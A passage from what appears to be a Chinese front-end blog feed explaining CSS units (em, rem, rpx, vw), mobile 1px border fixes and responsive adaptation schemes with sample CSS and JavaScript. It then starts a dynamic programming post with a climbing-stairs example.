class="token punctuation">:</span><span class="token number">10</span>em<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/*800px*/</span>    <span class="token punctuation">}</span>  <span class="token selector"><span class="token class">.child</span></span><span class="token punctuation">{</span>            <span class="token property">font-size</span><span class="token punctuation">:</span><span class="token number">2</span>em<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/*160px*/</span>            <span class="token property">height</span><span class="token punctuation">:</span><span class="token number">2</span>em<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/*320px*/</span>    <span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>parent<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>child<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></code></pre><p>在不设置元素font-size的情况下，em总是根据父元素的font-size来确定长度；即使元素设置了font-size，多次嵌套使用em也往往会造成疏忽，不仅使用前需要大量计算，而且不能保证没有漏网之鱼。这将是一个繁杂而低效率的工作。 于是有了rem.</p><h3 id="rem"><a href="#rem" class="headerlink" title="rem"></a>rem</h3><p>rem不是依据父元素——而是依据根元素（root element）来确定其长度。</p><p>我们一般给根元素设置一个容易计算的font-size</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">    <span class="token selector">html </span><span class="token punctuation">{</span>        <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">62.5%</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">/* 10px */</span>    <span class="token punctuation">}</span>    <span class="token selector">div </span><span class="token punctuation">{</span>        <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">2.4</span>rem<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* 24px */</span>        <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">64</span>rem<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">/* 640px */</span>        <span class="token property">border</span><span class="token punctuation">:</span> <span class="token number">0.1</span>rem solid <span class="token hexcode">#ccc</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* 1px */</span>    <span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>div2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></code></pre><h3 id="rpx"><a href="#rpx" class="headerlink" title="rpx"></a>rpx</h3><table><thead><tr><th style="text-align:left">设备</th><th style="text-align:left">rpx换算px (屏幕宽度/750)</th><th style="text-align:left">px换算rpx (750/屏幕宽度)</th></tr></thead><tbody><tr><td style="text-align:left">iPhone5</td><td style="text-align:left">1rpx = 0.42px</td><td style="text-align:left">1px = 2.34rpx</td></tr><tr><td style="text-align:left">iPhone6</td><td style="text-align:left">1rpx = 0.5px</td><td style="text-align:left">1px = 2rpx</td></tr><tr><td style="text-align:left">iPhone6 Plus</td><td style="text-align:left">1rpx = 0.552px</td><td style="text-align:left">1px = 1.81rpx</td></tr></tbody></table><ul><li>rpx（responsive pixel）: 可以根据屏幕宽度进行自适应。规定屏幕宽为750rpx。如在 iPhone6 上，屏幕宽度为375px，共有750个物理像素，则750rpx = 375px = 750物理像素，1rpx = 0.5px = 1物理像素。</li><li>建议小程序的设计稿以750 x 1334 的物理分辨率进行设计</li></ul><h3 id="vw-vh"><a href="#vw-vh" class="headerlink" title="vw,vh"></a>vw,vh</h3><ul><li>vw和vh是css3中的新单位，是一种视窗单位，在小程序中也同样适用。</li><li>小程序中，窗口宽度固定为100vw，将窗口宽度平均分成100份，1份是1vw</li><li>小程序中，窗口高度固定为100vh ，将窗口高度平均分成100份，1份是1vh</li><li>所以，我们在小程序中也可以使用vw、vh作为尺寸单位使用在布局中进行布局，但是一般情况下，百分比+rpx就已经足够使用了,所以它们的出场机会很少。</li></ul><h2 id="移动端-1px"><a href="#移动端-1px" class="headerlink" title="移动端 1px"></a>移动端 1px</h2><h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><ul><li>DPR(devicePixelRatio) 设备像素比 = 物理像素 / css像素 ，它是默认缩放为100%的屏幕下，设备像素和css像素的比值。</li><li>目前比较主流的设备的DPR=2或3，所以： 当我们的DPR为2，也就是2倍屏时，当物理像素（设备像素）为1px的时候，我们的css像素应该是0.5px。当DPR=3，物理像素为1px时，css像素应该为1/3px。</li></ul><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><h4 id="scale"><a href="#scale" class="headerlink" title="scale"></a>scale</h4><p>如果在一个元素上使用<code>scale</code>时会导致整个元素同时缩放，所以应该在该元素的伪元素下设置<code>scale</code>属性。</p><pre class=" language-css"><code class="language-css"><span class="token selector"><span class="token class">.scale</span><span class="token pseudo-element">::after</span> </span><span class="token punctuation">{</span>    <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>    <span class="token property">content</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token property">border-bottom</span><span class="token punctuation">:</span> <span class="token number">1</span>px solid <span class="token hexcode">#000</span><span class="token punctuation">;</span>    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">scaleY</span><span class="token punctuation">(</span><span class="token number">.5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h4 id="linear-gradient"><a href="#linear-gradient" class="headerlink" title="linear-gradient"></a>linear-gradient</h4><p>通过线性渐变，也可以实现移动端1px的线。原理大致是使用渐变色，上部分为白色，下部分为黑色。这样就可以将线从视觉上看只有1px。</p><p>由于是通过背景颜色渐变实现的，所以这里要使用伪元素并且设置伪元素的高度。 当然，也可以不使用伪元素，但是就会增加一个没有任何意义的空标签了。</p><pre class=" language-css"><code class="language-css"><span class="token selector">div<span class="token class">.linear</span><span class="token pseudo-element">::after</span> </span><span class="token punctuation">{</span>    <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>    <span class="token property">content</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">1</span>px<span class="token punctuation">;</span>    <span class="token property">background</span><span class="token punctuation">:</span> <span class="token function">linear-gradient</span><span class="token punctuation">(</span><span class="token number">0</span>, <span class="token hexcode">#fff</span>, <span class="token hexcode">#000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h4 id="box-shadow"><a href="#box-shadow" class="headerlink" title="box-shadow"></a>box-shadow</h4><p>通过<code>box-shaodow</code>来实现1px也可以，实现原理是将纵坐标的shadow设置为0.5px即可。<code>box-shadow</code>属性在Chrome和Firefox下支持小数设置，但是在Safari下不支持。所以使用该方法设置移动端1px时应该慎重使用。</p><pre class=" language-css"><code class="language-css"><span class="token selector">div<span class="token class">.shadow</span> </span><span class="token punctuation">{</span>    <span class="token property">box-shadow</span><span class="token punctuation">:</span> <span class="token number">0</span> <span class="token number">0.5</span>px <span class="token number">0</span> <span class="token number">0</span> <span class="token hexcode">#000</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="适配案例"><a href="#适配案例" class="headerlink" title="适配案例"></a>适配案例</h2><p><strong>设计给出750px的设计稿，也按照750px来开发h5页面，怎么在小程序的 webview 页面中适配？</strong></p><ul><li>transform: scale</li><li>hack 为占满全屏的透明盒子，因为小程序存在顶部栏，所以不能用 screenHeight</li><li>toFixed 是为了取整，防止小数出现 bug</li></ul><pre class=" language-js"><code class="language-js">                <span class="token keyword">function</span> <span class="token function">autoAdapt</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">var</span> screenWidth <span class="token operator">=</span> hack<span class="token punctuation">.</span>offsetWidth            <span class="token keyword">var</span> screenHeight <span class="token operator">=</span> hack<span class="token punctuation">.</span>offsetHeight            <span class="token keyword">var</span> scale <span class="token operator">=</span> <span class="token punctuation">(</span>screenWidth <span class="token operator">/</span> <span class="token number">750</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toFixed</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>scale <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                main<span class="token punctuation">.</span>style<span class="token punctuation">.</span>width <span class="token operator">=</span> <span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token punctuation">(</span>screenWidth <span class="token operator">/</span> scale<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toFixed</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">px`</span></span>                main<span class="token punctuation">.</span>style<span class="token punctuation">.</span>height <span class="token operator">=</span> <span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token punctuation">(</span>screenHeight <span class="token operator">/</span> scale<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toFixed</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">px`</span></span>                main<span class="token punctuation">.</span>style<span class="token punctuation">.</span>overflow <span class="token operator">=</span> <span class="token string">'auto'</span>                document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>style<span class="token punctuation">.</span>transform <span class="token operator">=</span> <span class="token template-string"><span class="token string">`scale(</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>scale<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">)`</span></span>                document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>style<span class="token punctuation">.</span>transformOrigin <span class="token operator">=</span> <span class="token string">'0% 0%'</span>                document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>style<span class="token punctuation">.</span>overflow <span class="token operator">=</span> <span class="token template-string"><span class="token string">`hidden`</span></span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                main<span class="token punctuation">.</span>style<span class="token punctuation">.</span>transform <span class="token operator">=</span> <span class="token template-string"><span class="token string">`scale(</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>scale<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">)`</span></span>                main<span class="token punctuation">.</span>style<span class="token punctuation">.</span>transformOrigin <span class="token operator">=</span> <span class="token string">'50% 0%'</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token function">autoAdapt</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        window<span class="token punctuation">.</span>onresize <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">autoAdapt</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span></code></pre><h2 id="常见移动端适配方案"><a href="#常见移动端适配方案" class="headerlink" title="常见移动端适配方案"></a>常见移动端适配方案</h2><ul><li>media queries</li><li>flex 布局</li><li>rem + viewport</li><li>vh vw</li><li>百分比</li></ul><h4 id="一、Meida-Queries"><a href="#一、Meida-Queries" class="headerlink" title="一、Meida Queries"></a>一、Meida Queries</h4><p>meida queries 的方式可以说是我早期采用的布局方式，它主要是通过查询设备的宽度来执行不同的 css 代码，最终达到界面的配置。</p><p><strong>核心语法:</strong></p><pre class=" language-css"><code class="language-css"><span class="token atrule"><span class="token rule">@media</span> only screen and <span class="token punctuation">(</span><span class="token property">max-width</span><span class="token punctuation">:</span> 374px<span class="token punctuation">)</span></span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">/* iphone5 或者更小的尺寸，以 iphone5 的宽度（320px）比例设置样式*/</span><span class="token punctuation">}</span><span class="token atrule"><span class="token rule">@media</span> only screen and <span class="token punctuation">(</span><span class="token property">min-width</span><span class="token punctuation">:</span> 375px<span class="token punctuation">)</span> and <span class="token punctuation">(</span><span class="token property">max-width</span><span class="token punctuation">:</span> 413px<span class="token punctuation">)</span></span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">/* iphone6/7/8 和 iphone x */</span><span class="token punctuation">}</span><span class="token atrule"><span class="token rule">@media</span> only screen and <span class="token punctuation">(</span><span class="token property">min-width</span><span class="token punctuation">:</span> 414px<span class="token punctuation">)</span></span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">/* iphone6p 或者更大的尺寸，以 iphone6p 的宽度（414px）比例设置样式 */</span><span class="token punctuation">}</span>复制代码</code></pre><p><strong>优点：</strong></p><ul><li>media query 可以做到设备像素比的判断，方法简单，成本低，特别是针对移动端和 PC 端维护同一套代码的时候。目前像 Bootstrap 等框架使用这种方式布局</li><li>图片便于修改，只需修改 css 文件</li><li>调整屏幕宽度的时候不用刷新页面即可响应式展示</li></ul><p><strong>缺点：</strong></p><ul><li>代码量比较大，维护不方便</li><li>为了兼顾大屏幕或高清设备，会造成其他设备资源浪费，特别是加载图片资源</li><li>为了兼顾移动端和 PC 端各自响应式的展示效果，难免会损失各自特有的交互方式</li></ul><h4 id="二、Flex-弹性布局"><a href="#二、Flex-弹性布局" class="headerlink" title="二、Flex 弹性布局"></a>二、Flex 弹性布局</h4><p>以天猫的实现方式进行说明：</p><p>它的 viewport 是固定的：<code>&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no&quot;&gt;</code></p><p>高度定死，宽度自适应，元素都采用 px 做单位。</p><p>随着屏幕宽度变化，页面也会跟着变化，效果就和 PC 页面的流体布局差不多，在哪个宽度需要调整的时候使用响应式布局调调就行（比如网易新闻），这样就实现了『适配』。</p><h4 id="三、rem-viewport-缩放"><a href="#三、rem-viewport-缩放" class="headerlink" title="三、rem+viewport 缩放"></a>三、rem+viewport 缩放</h4><p><strong>实现原理：</strong></p><p>根据 rem 将页面放大 dpr 倍, 然后 viewport 设置为 1/dpr.</p><ul><li>如 iphone6 plus 的 dpr 为 3, 则页面整体放大 3 倍, 1px(css 单位)在 plus 下默认为 3px(物理像素)</li><li>然后 viewport 设置为 1/3, 这样页面整体缩回原始大小. 从而实现高清。</li></ul><p>这样整个网页在设备内显示时的页面宽度就会等于设备逻辑像素大小，也就是 device-width。这个 device-width 的计算公式为：</p><p><code>设备的物理分辨率/(devicePixelRatio * scale)</code>，在 scale 为 1 的情况下，<code>device-width = 设备的物理分辨率/devicePixelRatio</code>。</p><h4 id="四、rem-实现"><a href="#四、rem-实现" class="headerlink" title="四、rem 实现"></a>四、rem 实现</h4><p><code>rem</code>是相对长度单位，<code>rem</code>方案中的样式设计为相对于根元素<code>font-size</code>计算值的倍数。根据屏幕宽度设置<code>html</code>标签的<code>font-size</code>，在布局时使用 <strong>rem</strong> 单位布局，达到自适应的目的。</p><p>viewport 是固定的：<code>&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no&quot;&gt;</code>。</p><p>通过以下代码来控制 rem 基准值(设计稿以 720px 宽度量取实际尺寸)</p><pre class=" language-js"><code class="language-js"><span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>d<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> c <span class="token operator">=</span> d<span class="token punctuation">.</span>document<span class="token punctuation">;</span>  <span class="token keyword">var</span> a <span class="token operator">=</span> c<span class="token punctuation">.</span>documentElement<span class="token punctuation">;</span>  <span class="token keyword">var</span> b <span class="token operator">=</span> d<span class="token punctuation">.</span>devicePixelRatio<span class="token punctuation">;</span>  <span class="token keyword">var</span> f<span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function">e</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> h <span class="token operator">=</span> a<span class="token punctuation">.</span><span class="token function">getBoundingClientRect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>width<span class="token punctuation">,</span>      g<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      h <span class="token operator">=</span> <span class="token number">720</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>h <span class="token operator">></span> <span class="token number">720</span><span class="token punctuation">)</span> h <span class="token operator">=</span> <span class="token number">720</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置基准值的极限值</span>    g <span class="token operator">=</span> h <span class="token operator">/</span> <span class="token number">7.2</span><span class="token punctuation">;</span>    a<span class="token punctuation">.</span>style<span class="token punctuation">.</span>fontSize <span class="token operator">=</span> g <span class="token operator">+</span> <span class="token string">"px"</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    b <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      b <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>      b <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  a<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"data-dpr"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>  d<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span>    <span class="token string">"resize"</span><span class="token punctuation">,</span>    <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">clearTimeout</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>      f <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token boolean">false</span>  <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">e</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span>window<span class="token punctuation">)</span><span class="token punctuation">;</span>复制代码</code></pre><p>css 通过 sass 预编译，设置量取的 px 值转化 rem 的变量<code>$px: (1/100)+rem;</code></p><p>优点：</p><ul><li>兼容性好，页面不会因为伸缩发生变形，自适应效果更佳。</li></ul><p>缺点：</p><ul><li>不是纯 css 移动适配方案，需要在头部内嵌一段 <code>js</code>脚本监听分辨率的变化来动态改变根元素的字体大小，<code>css</code>样式和 <code>js</code> 代码有一定耦合性，并且必须将改变<code>font-size</code>的代码放在 <code>css</code> 样式之前。</li><li>小数像素问题，浏览器渲染最小的单位是像素，元素根据屏幕宽度自适应，通过 <code>rem</code> 计算后可能会出现小数像素，浏览器会对这部分小数四舍五入，按照整数渲染，有可能没那么准确。</li></ul><h4 id="五、纯-vw-方案"><a href="#五、纯-vw-方案" class="headerlink" title="五、纯 vw 方案"></a>五、纯 vw 方案</h4><p>视口是浏览器中用于呈现网页的区域。</p><ul><li><strong>vw</strong> : <strong>1vw</strong> 等于 <strong>视口宽度</strong> 的 <strong>1%</strong></li><li><strong>vh</strong> : <strong>1vh</strong>  等于 <strong>视口高度</strong> 的 <strong>1% </strong></li><li><strong>vmin</strong> : 选取 <strong>vw</strong> 和 <strong>vh</strong> 中 <strong>最小</strong> 的那个</li><li><strong>vmax</strong> : 选取 <strong>vw</strong> 和 <strong>vh</strong> 中 <strong>最大</strong> 的那个</li></ul><p>虽然 vw 能更优雅的适配，但是还是有点小问题，就是宽，高没法限制。</p><pre class=" language-js"><code class="language-js">$base_vw <span class="token operator">=</span> <span class="token number">375</span><span class="token punctuation">;</span>@<span class="token keyword">function</span> vw <span class="token punctuation">(</span>$px<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>$px<span class="token operator">/</span>$base_vw<span class="token punctuation">)</span> <span class="token operator">*</span> 100vw<span class="token punctuation">}</span><span class="token punctuation">;</span>复制代码</code></pre><p>优点：</p><ul><li>纯 <code>css</code> 移动端适配方案，不存在脚本依赖问题。</li><li>相对于 <code>rem</code> 以根元素字体大小的倍数定义元素大小，逻辑清晰简单。</li></ul><p>缺点：</p><ul><li>存在一些兼容性问题，有些浏览器不支持</li></ul><h4 id="六、vw-rem-方案"><a href="#六、vw-rem-方案" class="headerlink" title="六、vw + rem 方案"></a>六、vw + rem 方案</h4><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// scss 语法</span><span class="token comment" spellcheck="true">// 设置html根元素的大小 750px->75 640px->64</span><span class="token comment" spellcheck="true">// 将屏幕分成10份，每份作为根元素的大小。</span>$vw_fontsize<span class="token punctuation">:</span> <span class="token number">75</span>@<span class="token keyword">function</span> <span class="token function">rem</span><span class="token punctuation">(</span>$px<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 例如：一个div的宽度为100px，那么它对应的rem单位就是（100/根元素的大小）* 1rem</span>    @<span class="token keyword">return</span> <span class="token punctuation">(</span>$px <span class="token operator">/</span> $vw_fontsize<span class="token punctuation">)</span> <span class="token operator">*</span> 1rem<span class="token punctuation">;</span><span class="token punctuation">}</span>$base_design<span class="token punctuation">:</span> <span class="token number">750</span>html <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// rem与vw相关联</span>    font<span class="token operator">-</span>size<span class="token punctuation">:</span> <span class="token punctuation">(</span>$vw_fontsize <span class="token operator">/</span> <span class="token punctuation">(</span>$base_design <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> 100vw<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 同时，通过Media Queries 限制根元素最大最小值</span>    @media screen and <span class="token punctuation">(</span>max<span class="token operator">-</span>width<span class="token punctuation">:</span> 320px<span class="token punctuation">)</span> <span class="token punctuation">{</span>        font<span class="token operator">-</span>size<span class="token punctuation">:</span> 64px<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    @media screen and <span class="token punctuation">(</span>min<span class="token operator">-</span>width<span class="token punctuation">:</span> 540px<span class="token punctuation">)</span> <span class="token punctuation">{</span>        font<span class="token operator">-</span>size<span class="token punctuation">:</span> 108px<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// body 也增加最大最小宽度限制，避免默认100%宽度的 block 元素跟随 body 而过大过小</span>body <span class="token punctuation">{</span>    max<span class="token operator">-</span>width<span class="token punctuation">:</span> 540px<span class="token punctuation">;</span>    min<span class="token operator">-</span>width<span class="token punctuation">:</span> 320px<span class="token punctuation">;</span><span class="token punctuation">}</span>复制代码</code></pre><h4 id="七、百分比"><a href="#七、百分比" class="headerlink" title="七、百分比"></a>七、百分比</h4><p>使用百分比%定义宽度，高度用<code>px</code>固定，根据可视区域实时尺寸进行调整，尽可能适应各种分辨率，通常使用<code>max-width</code>/<code>min-width</code>控制尺寸范围过大或者过小。</p><p>优点：</p><ul><li>原理简单，不存在兼容性问题</li></ul><p>缺点：</p><ul><li>如果屏幕尺度跨度太大，相对设计稿过大或者过小的屏幕不能正常显示，在大屏手机或横竖屏切换场景下可能会导致页面元素被拉伸变形，字体大小无法随屏幕大小发生变化。</li><li>设置盒模型的不同属性时，其百分比设置的参考元素不唯一，容易使布局问题变得复杂。</li></ul><blockquote><p>作者：前端先锋<br>链接：<a href="https://juejin.cn/post/6899291168891207688" target="_blank" rel="noopener">https://juejin.cn/post/6899291168891207688</a><br>来源：掘金</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 移动端 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>动态规划</title>
      <link href="2020/11/16/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
      <url>2020/11/16/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/</url>
      
        <content type="html"><![CDATA[<ul><li>爬楼梯</li><li>零钱兑换</li><li>最大子序列和</li><li>最长递增子序列</li><li>最长公共子序列</li><li>最长回文子串</li><li>不同路径</li><li>最小路径和</li><li>正则表达式匹配</li><li>分割等和子集</li><li>三角形的最小路径和</li><li>买卖股票的最佳时机</li><li>买卖股票的最佳时机（含冷冻期）</li><li>打家劫舍</li></ul><blockquote><p>动态规划的三个概念：最优子结构，边界，状态转移方程</p></blockquote><h2 id="动态规划与贪心的区别"><a href="#动态规划与贪心的区别" class="headerlink" title="动态规划与贪心的区别"></a>动态规划与贪心的区别</h2><blockquote><p>贪心算法中，作出的每步贪心决策都无法改变，因为贪心策略是由上一步的最优解推导下一步的最优解，而上一部之前的最优解则不作保留。 贪心是求局部最优，以得到全局最优（不一定是正确的，需要证明）</p><p>比如某国的钱币分为1元3元4元，如果要拿6元钱怎么拿？贪心的话先拿4再拿两个1，一共3张钱，而实际最优其实是两张3元（类似于背包问题，需要考虑物品个数）</p><p>动态规划算法中，全局最优解中一定包含某个局部最优解，但不一定包含前一个局部最优解，因此需要记录之前的所有最优解 </p></blockquote><h2 id="爬楼梯"><a href="#爬楼梯" class="headerlink" title="爬楼梯"></a>爬楼梯</h2><pre class=" language-js"><code class="language-js">有一座高度是<span class="token number">10</span>级台阶的楼梯，从下往上走，每跨一步只能向上<span class="token number">1</span>级或者<span class="token number">2</span>级台阶。要求用程序来求出一共有多少种走法。</code></pre><ul><li>思考：如果只差最后一步就走到第 10 级，此时分为两种：从第 9 级到 10 级，从第 8 级到 10 级</li><li>0 到 9 级的走法有 x，0 到 8 级的走法有 y 种，那么 0 到 10 级的走法一共有 x+y</li><li>F(10) = F(9) + F(8)，F(8) = F(8) + F(7)</li><li>F(9) 和 F(8) 是 F(10) 的最优子结构</li><li>边界是 F(1) 和 F(2)</li><li>状态转移方程是 F(n) = F(n-1) + F(n-2)</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">getClimbingWays</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">===</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">2</span>    <span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">,</span> temp <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        temp <span class="token operator">=</span> a <span class="token operator">+</span> b        a <span class="token operator">=</span> b        b <span class="token operator">=</span> temp    <span class="token punctuation">}</span>    <span class="token keyword">return</span> temp<span class="token punctuation">}</span></code></pre><h2 id="零钱兑换"><a href="#零钱兑换" 